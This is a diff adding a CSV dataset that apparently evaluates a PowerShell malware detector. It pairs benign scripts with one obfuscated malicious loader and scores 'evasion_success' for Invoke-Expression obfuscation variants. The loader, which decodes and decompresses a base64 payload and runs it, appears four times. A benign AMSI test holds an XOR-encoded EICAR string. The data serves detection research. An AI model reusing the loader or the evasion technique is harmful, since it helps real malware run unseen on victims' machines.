@@ -1,0 +1,181 @@
+filename,label,source,primary_indicator,matched_indicators,indicator_count,has_indicator,raw_char_len,used_char_len,was_truncated,content,pair_idx,pair_role,pair_indicator,correct,predicted_label,logit_diff,evasion_variant_id,evasion_technique_id,seed_id,source_pair_idx,predicted_label_variant_eval,variant_logit_diff,baseline_logit_diff_seed,candidate_tier,evasion_success,logit_delta_vs_seed
+1767.ps1,benign,natural_overlap,Invoke-Expression,Invoke-Expression|FromBase64String,2,True,1224,1224,False,"﻿
+
+
+try
+{
+    $defaultParamValues = $PSDefaultParameterValues.Clone()
+    $PSDefaultParameterValues[""it:Skip""] = !$IsWindows
+
+    Describe ""AMSI scan should detect suspicious content"" -Tags 'Feature','RequireAdminOnWindows' {
+
+        BeforeAll {
+            [System.Management.Automation.Internal.InternalTestHooks]::SetTestHook(""UseDebugAmsiImplementation"", $true)
+        }
+
+        AfterAll {
+            [System.Management.Automation.Internal.InternalTestHooks]::SetTestHook(""UseDebugAmsiImplementation"", $false)
+        }
+
+        It ""Verifies AMSI scan detects debug suspicious content"" {
+
+            $EICAR_STRING_B64 = ""awZ8EmMWc3JjaAdvY2lrBgcbY20aBHBwGgROF3Z6cHJhHmBncn13cmF3HnJ9Z3plemFmYB5ndmBnHnV6f3YSF3sYexk= ""
+            $bytes = [System.Convert]::FromBase64String($EICAR_STRING_B64)
+            $EICAR_STRING = -join ($bytes | ForEach-Object { [char]($_ -bxor 0x33) })
+            { Invoke-Expression -Command ""echo '$EICAR_STRING'"" } |
+                Should -Throw -ErrorId ""ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand""
+        }
+    }
+}
+finally
+{
+    if ($defaultParamValues -ne $null)
+    {
+        $Global:PSDefaultParameterValues = $defaultParamValues
+    }
+}",61,benign,Invoke-Expression,True,benign,-2.90625,variant_d3b8bc53c3bb,invoke_expression_format_string,seed_d4aff830a1c9,61,benign,-0.125,0.125,strict,True,-0.25
+2019.ps1,malicious,natural_overlap,Invoke-Expression,Invoke-Expression|FromBase64String,2,True,1173,1173,False,"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('lVVNb9pAEL0j8R/2YAlbwRuTRFXbKId8tYpUBYRT9RBycNYD2WJ2qXddSBH/vbMfBhzRNOFi8L438+bNzDKuBNNcCsIKyEQ1J6t2i49JGLCCg9D0UgoBTENOYvhFAl1WEJHV5rSQCsJo7TnzUjJQil4vub6UOZBYAAlEVRSGU59uSYA4fBwekhQ05r4ZnF9dDdutIMvzEqHkjHR6n45o78NHeoKP46PODnrQH94hdi5LbYAn+MFjLw3f3MIi7j/+RPVEPSsNMypAUyXZFLSims0dckOhzNUa1um7NnaEAKVLyGYYs4Z+BZ3ad6E5xrgLWU4fq/EYymbm1GW+eNZw/7ChD4EB/w0XlpDyP2DqcPbspV/xbCKk0pwpOnC4LYOmOiv1jRhL+oUXcJvNwPhx+Xk0WnCRy4UajZwBx0ejEZvlFJbQ2csfQs5LzItvRJ6V+Y2YV8bK3pvQ/Uq/Bv+uIH2CorheAqu00Zi8xFk3uUm6dXwHsNWEMGmz/Rvn1LRbNnCcFgBzKwwEkzkXE+QINFo2jL6DpabninF+7WHt1uIJXQ0b+egAYBpGdr7jXrQyh+QARdTB/YDgtxfEIWR5GJnh90NFf5RcY/hdppkWZYlRN+maJ/0GYqKfIle3Kdds1SkJcimMk8E4KxTgbyRqV1xy6qWTMBZSO2j0yn6bXfX77S+DtV0vZYORgLvO+pgh/o4nmiToAhputh+RcYGJGutQK7eZA6w4N3J33WjizdLh5u2LQWJiDiOn6uDMRjsl7uoxyZ2OBvU+oTSwx9inBxLjjuuMC0V6iZH0iCGm6839ZYK4mlauQc7KvW1tqk66tbSd8aUL11sXCA+VnUVVz+L/L81tIwD7a1X5/r910t40vz7seybY+25o9p/B10hWXmCns373kBf7hrzRCPNivSbOjNoczPMX')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();",61,malicious,Invoke-Expression,True,malicious,0.125,variant_d3b8bc53c3bb,invoke_expression_format_string,seed_d4aff830a1c9,61,benign,-0.125,0.125,strict,True,-0.25
+583.ps1,benign,natural_overlap,Invoke-Expression,Invoke-Expression,3,True,1109,1109,False,"﻿
+
+function Connect-RDP{
+
+
+
+	param (
+        [parameter(Mandatory=$true)]
+        [string[]]$Name
+	)
+    
+    
+    
+    
+    if ((Get-Command ""cmdkey"") -and (Get-Command ""mstsc"")){ 
+    
+        
+        
+        $Servers = Get-RemoteConnection -Name $Name
+       
+        if(!(Get-ChildItem -Path $PSconfigs.Path -Filter $PStemplates.RDP.Name -Recurse)){
+        
+            Write-Host ""Copy $($PStemplates.RDP.Name) file to the config folder""        
+    		Copy-Item -Path $PStemplates.RDP.FullName -Destination (Join-Path -Path $PSconfigs.Path -ChildPath $PStemplates.RDP.Name)
+    	} 
+		$RDPDefaultFile = $(Get-ChildItem -Path $PSconfigs.Path -Filter $PStemplates.RDP.Name -Recurse).Fullname		
+
+        foreach($Server in $Servers){
+		        
+            $Servername = $Server.Name
+            $Username = $Server.User
+
+            
+            $Null = Invoke-Expression ""cmdkey /delete:'$Servername'""
+
+            
+            $Null = Invoke-Expression ""cmdkey /generic:'$Servername' /user:'$Username'""
+
+            
+            Invoke-Expression ""mstsc '$RDPDefaultFile' /v:$Servername""
+	    }
+    }
+}",62,benign,Invoke-Expression,True,benign,-1.3125,variant_564492e968fc,invoke_expression_format_string,seed_8308722f08a5,62,benign,-0.25,0.125,strict,True,-0.375
+2019.ps1,malicious,natural_overlap,Invoke-Expression,Invoke-Expression|FromBase64String,2,True,1173,1173,False,"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('lVVNb9pAEL0j8R/2YAlbwRuTRFXbKId8tYpUBYRT9RBycNYD2WJ2qXddSBH/vbMfBhzRNOFi8L438+bNzDKuBNNcCsIKyEQ1J6t2i49JGLCCg9D0UgoBTENOYvhFAl1WEJHV5rSQCsJo7TnzUjJQil4vub6UOZBYAAlEVRSGU59uSYA4fBwekhQ05r4ZnF9dDdutIMvzEqHkjHR6n45o78NHeoKP46PODnrQH94hdi5LbYAn+MFjLw3f3MIi7j/+RPVEPSsNMypAUyXZFLSims0dckOhzNUa1um7NnaEAKVLyGYYs4Z+BZ3ad6E5xrgLWU4fq/EYymbm1GW+eNZw/7ChD4EB/w0XlpDyP2DqcPbspV/xbCKk0pwpOnC4LYOmOiv1jRhL+oUXcJvNwPhx+Xk0WnCRy4UajZwBx0ejEZvlFJbQ2csfQs5LzItvRJ6V+Y2YV8bK3pvQ/Uq/Bv+uIH2CorheAqu00Zi8xFk3uUm6dXwHsNWEMGmz/Rvn1LRbNnCcFgBzKwwEkzkXE+QINFo2jL6DpabninF+7WHt1uIJXQ0b+egAYBpGdr7jXrQyh+QARdTB/YDgtxfEIWR5GJnh90NFf5RcY/hdppkWZYlRN+maJ/0GYqKfIle3Kdds1SkJcimMk8E4KxTgbyRqV1xy6qWTMBZSO2j0yn6bXfX77S+DtV0vZYORgLvO+pgh/o4nmiToAhputh+RcYGJGutQK7eZA6w4N3J33WjizdLh5u2LQWJiDiOn6uDMRjsl7uoxyZ2OBvU+oTSwx9inBxLjjuuMC0V6iZH0iCGm6839ZYK4mlauQc7KvW1tqk66tbSd8aUL11sXCA+VnUVVz+L/L81tIwD7a1X5/r910t40vz7seybY+25o9p/B10hWXmCns373kBf7hrzRCPNivSbOjNoczPMX')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();",62,malicious,Invoke-Expression,True,malicious,0.125,variant_564492e968fc,invoke_expression_format_string,seed_8308722f08a5,62,benign,-0.25,0.125,strict,True,-0.375
+489.ps1,benign,natural_overlap,Invoke-Expression,Invoke-Expression,1,True,1040,1040,False,"function Get-PathAndFilename{
+
+
+
+    [CmdletBinding()]
+    param(
+
+		[Parameter( Mandatory=$true)]
+		[String]
+		$Path
+	)
+
+    
+    $Path = [System.Environment]::ExpandEnvironmentVariables($Path)
+    
+    
+    if($Path.contains(""$"")){
+        $Path = Invoke-Expression ""`""$Path`""""
+    }
+
+    
+    if($Path.StartsWith(""\"")){
+        $Path = Join-Path -Path $(Get-Location).Path -Childpath $Path
+    }
+    
+    
+    if(-not $Path.Contains(""\"")){
+    
+        $Filename = $Path
+        $Path = $null
+    
+    }else{
+    
+        
+        $ResolvedPath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($Path)
+        $Path = $ResolvedPath + $(if($Path.EndsWith(""\"") -and -not $ResolvedPath.EndsWith(""\"")){""\""})
+
+        
+        if($Path.EndsWith(""\"")){
+        
+            $Filename = $null
+        
+        }else{
+            
+            $Filename = Split-Path $Path -Leaf
+            $Path = Split-Path $Path -Parent         
+        }
+    }
+    
+    @{
+        Path = $Path
+        Filename = $FileName    
+    }
+}",65,benign,Invoke-Expression,True,benign,-2.78125,variant_373298990f92,invoke_expression_format_string,seed_a182289ca98a,65,benign,-0.25,0.125,strict,True,-0.375
+2019.ps1,malicious,natural_overlap,Invoke-Expression,Invoke-Expression|FromBase64String,2,True,1173,1173,False,"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('lVVNb9pAEL0j8R/2YAlbwRuTRFXbKId8tYpUBYRT9RBycNYD2WJ2qXddSBH/vbMfBhzRNOFi8L438+bNzDKuBNNcCsIKyEQ1J6t2i49JGLCCg9D0UgoBTENOYvhFAl1WEJHV5rSQCsJo7TnzUjJQil4vub6UOZBYAAlEVRSGU59uSYA4fBwekhQ05r4ZnF9dDdutIMvzEqHkjHR6n45o78NHeoKP46PODnrQH94hdi5LbYAn+MFjLw3f3MIi7j/+RPVEPSsNMypAUyXZFLSims0dckOhzNUa1um7NnaEAKVLyGYYs4Z+BZ3ad6E5xrgLWU4fq/EYymbm1GW+eNZw/7ChD4EB/w0XlpDyP2DqcPbspV/xbCKk0pwpOnC4LYOmOiv1jRhL+oUXcJvNwPhx+Xk0WnCRy4UajZwBx0ejEZvlFJbQ2csfQs5LzItvRJ6V+Y2YV8bK3pvQ/Uq/Bv+uIH2CorheAqu00Zi8xFk3uUm6dXwHsNWEMGmz/Rvn1LRbNnCcFgBzKwwEkzkXE+QINFo2jL6DpabninF+7WHt1uIJXQ0b+egAYBpGdr7jXrQyh+QARdTB/YDgtxfEIWR5GJnh90NFf5RcY/hdppkWZYlRN+maJ/0GYqKfIle3Kdds1SkJcimMk8E4KxTgbyRqV1xy6qWTMBZSO2j0yn6bXfX77S+DtV0vZYORgLvO+pgh/o4nmiToAhputh+RcYGJGutQK7eZA6w4N3J33WjizdLh5u2LQWJiDiOn6uDMRjsl7uoxyZ2OBvU+oTSwx9inBxLjjuuMC0V6iZH0iCGm6839ZYK4mlauQc7KvW1tqk66tbSd8aUL11sXCA+VnUVVz+L/L81tIwD7a1X5/r910t40vz7seybY+25o9p/B10hWXmCns373kBf7hrzRCPNivSbOjNoczPMX')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();",65,malicious,Invoke-Expression,True,malicious,0.125,variant_373298990f92,invoke_expression_format_string,seed_a182289ca98a,65,benign,-0.25,0.125,strict,True,-0.375
+485.ps1,benign,natural_overlap,Invoke-Expression,Invoke-Expression,3,True,1023,1023,False,"function Remove-EnvironmentVariableValue{
+
+
+
+    [CmdletBinding()]
+    param(
+
+		[Parameter(Mandatory=$true)]
+		[String]
+		$Name,
+        
+		[Parameter(Mandatory=$true)]
+		[String]
+		$Value, 
+         
+		[Parameter(Mandatory=$true)]
+		[String]
+		$Target,  
+
+		[Switch]
+		$Clear  
+	)  
+  
+    
+    
+    
+
+    [Environment]::GetEnvironmentVariable($Name,$Target) | %{
+                
+        if(($_.Contains($Value) -or (Invoke-Expression ""`$env:$Name"").contains($Value)) -and -not $Clear){
+            
+            Write-Host ""Remove value: $Value from variable: $Name""            
+            $Value = $_.Trim($Value)
+            [Environment]::SetEnvironmentVariable($Name, $Value,$Target)
+            Invoke-Expression ""`$env:$Name = `""$Value`""""
+        
+        }elseif($Clear){
+        
+            Write-Host ""Set value from variable: $Name to `$null""
+            [Environment]::SetEnvironmentVariable($Name,$null,$Target)    
+            Invoke-Expression ""`$env:$Name = `$null""        
+        }
+    }     
+}       ",66,benign,Invoke-Expression,True,benign,-2.234375,variant_9ba9a02d030b,invoke_expression_format_string,seed_4916dd4c361c,66,benign,-0.25,0.125,strict,True,-0.375
+2019.ps1,malicious,natural_overlap,Invoke-Expression,Invoke-Expression|FromBase64String,2,True,1173,1173,False,"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('lVVNb9pAEL0j8R/2YAlbwRuTRFXbKId8tYpUBYRT9RBycNYD2WJ2qXddSBH/vbMfBhzRNOFi8L438+bNzDKuBNNcCsIKyEQ1J6t2i49JGLCCg9D0UgoBTENOYvhFAl1WEJHV5rSQCsJo7TnzUjJQil4vub6UOZBYAAlEVRSGU59uSYA4fBwekhQ05r4ZnF9dDdutIMvzEqHkjHR6n45o78NHeoKP46PODnrQH94hdi5LbYAn+MFjLw3f3MIi7j/+RPVEPSsNMypAUyXZFLSims0dckOhzNUa1um7NnaEAKVLyGYYs4Z+BZ3ad6E5xrgLWU4fq/EYymbm1GW+eNZw/7ChD4EB/w0XlpDyP2DqcPbspV/xbCKk0pwpOnC4LYOmOiv1jRhL+oUXcJvNwPhx+Xk0WnCRy4UajZwBx0ejEZvlFJbQ2csfQs5LzItvRJ6V+Y2YV8bK3pvQ/Uq/Bv+uIH2CorheAqu00Zi8xFk3uUm6dXwHsNWEMGmz/Rvn1LRbNnCcFgBzKwwEkzkXE+QINFo2jL6DpabninF+7WHt1uIJXQ0b+egAYBpGdr7jXrQyh+QARdTB/YDgtxfEIWR5GJnh90NFf5RcY/hdppkWZYlRN+maJ/0GYqKfIle3Kdds1SkJcimMk8E4KxTgbyRqV1xy6qWTMBZSO2j0yn6bXfX77S+DtV0vZYORgLvO+pgh/o4nmiToAhputh+RcYGJGutQK7eZA6w4N3J33WjizdLh5u2LQWJiDiOn6uDMRjsl7uoxyZ2OBvU+oTSwx9inBxLjjuuMC0V6iZH0iCGm6839ZYK4mlauQc7KvW1tqk66tbSd8aUL11sXCA+VnUVVz+L/L81tIwD7a1X5/r910t40vz7seybY+25o9p/B10hWXmCns373kBf7hrzRCPNivSbOjNoczPMX')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();",66,malicious,Invoke-Expression,True,malicious,0.125,variant_9ba9a02d030b,invoke_expression_format_string,seed_4916dd4c361c,66,benign,-0.25,0.125,strict,True,-0.375
